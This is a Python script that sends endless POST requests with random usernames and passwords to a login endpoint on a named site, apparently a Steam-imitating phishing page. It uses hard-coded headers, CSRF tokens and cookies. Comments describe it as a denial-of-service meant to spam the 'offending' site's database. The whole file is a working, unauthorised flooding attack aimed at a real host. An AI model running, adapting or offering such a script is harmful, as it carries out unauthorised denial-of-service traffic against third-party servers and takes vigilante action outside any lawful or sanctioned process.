#!/usr/bin/python3
# -*- coding: UTF-8 -*-

import requests
import logging
import random
import os
import sys
import platform
import string
from time import ctime
from colorama import init, Fore, Back, Style

# Logging config
logging.basicConfig(level=logging.DEBUG,
					filename='spam.log',
					filemode='w',
					format=('%(asctime)s - %(levelname)s - ' +
					'%(funcName)s - %(message)s'),
					datefmt='%d-%m-%y %H:%M:%S')
logging.getLogger().addHandler(logging.StreamHandler())

pyVer = platform.python_version_tuple()

# Generates random string
def randomString(stringLength=10):
	letters = string.ascii_lowercase+string.ascii_uppercase+string.digits
	return ''.join(random.choice(letters) for i in range(stringLength))


def setup():
	init()

	logging.info(Fore.YELLOW)
	logging.info('Started application at: ' + ctime())
	logging.info('-===========- [ INIT ] -===========-')
	logging.info('-==- [ SYS INFO ] -==-')
	logging.info('system    : ' + platform.system())
	logging.info('release   : ' + platform.release())
	logging.info('version   : ' + platform.version())
	logging.info('node      : ' + platform.node())
	logging.info('machine   : ' + platform.machine())
	logging.info('processor : ' + platform.processor())
	logging.info('-==- [ SYS INFO ] -==-')
	logging.info('-==- [ APP INFO ] -==-')
	logging.info('python    : ' + platform.python_version())
	logging.info('version   : ' + platform.python_compiler())
	logging.info('-==- [ APP INFO ] -==-')

	if pyVer[0] == '2':
		logging.error(Fore.RED)
		logging.error('Python version is not compatible! Please install python3!')
		logging.error(Fore.RESET)
		exit()

	logging.info('Setup complete!')
	logging.info(Fore.RESET)
	dbSpam()

# DoS for offending site 
def dbSpam():
	logging.info('Spamming "bsctmw.com" database...')

	# Connection headers
	headers = {
		'Host': 'bsctmw.com',
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0',
		'Accept': '*/*',
		'Accept-Language': 'en-US,en;q=0.5',
		'Referer': 'https://bsctmw.com/uncheck2/',
		'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
		'CSRF-Token': 'k2hy76jh-JOGwlBDHExj2q0NpNa6AqKWX17o',
		'X-Requested-With': 'XMLHttpRequest',
		'Connection': 'keep-alive',
	}

	# Connection cookies
	cookies = {
	#	'__ddg_': '856806E1D761B35E7BE4173938CABFA9052143F6',
		'_csrf': 'tAgle4ZPqH5PysmmkuZtYtDZ',
	#	'XSRF-TOKEN': 'J2vg9DJs-jEQX97cQKqq-3VqUvX95KKp6h64',
	#	'connect.sid': 's%3Aheppfz0bgX8TALAmhlM5gVfFuToKzYd5.zcvVtjQKgHehDXUb9fTSYATM1Ocafaer9luITzifKgE',
	#	'item': '{name:Karambit | Crimson Web,quality:Minimal Wear,img:https://steamcommunity-a.akamaihd.net/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpovbSsLQJf2PLacDBA5ciJnJm0gPL2IITdn2xZ_Pp9i_vG8MKj2Qbl_EdlZziiddOXdAY2YAvT-wW2xrjugJG_tcvNyyBn6SEm4XuMgVXp1n8qZn5H/360fx360f}',
	#	'img': 'https://steamcommunity-a.akamaihd.net/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpovbSsLQJf2PLacDBA5ciJnJm0gPL2IITdn2xZ_Pp9i_vG8MKj2Qbl_EdlZziiddOXdAY2YAvT-wW2xrjugJG_tcvNyyBn6SEm4XuMgVXp1n8qZn5H/360fx360f',
	#	'name': 'Karambit | Crimson Web (Minimal Wear)',
		'human': 'yes',
	}


	logging.debug('Headers used to attack the offending db:')
	for h in headers:
		logging.debug(Fore.GREEN + h + Fore.RESET)

	logging.debug('Cookies used to attack the offending db:')
	for c in cookies:
		logging.debug(Fore.GREEN + c + Fore.RESET)



	while True:
		logging.debug('Starting loop')

		username = randomString(random.randrange(12,20,1))
		password = randomString(random.randrange(12,20,1))

		# Connection parameters
		params = {
			'emailauth': '',
			'emailsteamid': '',
			'loginfriendlyname': '',
			'login': username,
			'domain': 'bsctmw.com',
			'_csrf': 'k2hy76jh-JOGwlBDHExj2q0NpNa6AqKWX17o',
			'password': password,
			'captchagid': '-1',
			'captcha_text': ''
		}

		logging.debug('Params used to attack offending db:')
		for p in params:
			logging.debug(Fore.GREEN + p + Fore.RESET)
		
		logging.info('Logging in with:' + Fore.CYAN)
		logging.info('- user     : ' + username)
		logging.info('- password : ' + password + Fore.RESET)

		# Sending and receiving connection from server that is being attacked
		# This is defined as a HTTP responce code
		logging.info(Fore.YELLOW)
		response = requests.post('https://bsctmw.com/uncheck2', headers=headers, cookies=cookies, params=params)
		
		logging.info('Response from server: {}'.format(response.status_code))
		logging.info(Fore.RESET)

if __name__ == '__main__':
	try:
		setup()
	except KeyboardInterrupt:
		logging.info(Fore.RESET)
		logging.info('THREAD STOPPED!')
		try:
			sys.exit(0)
		except:
			os._exit(0)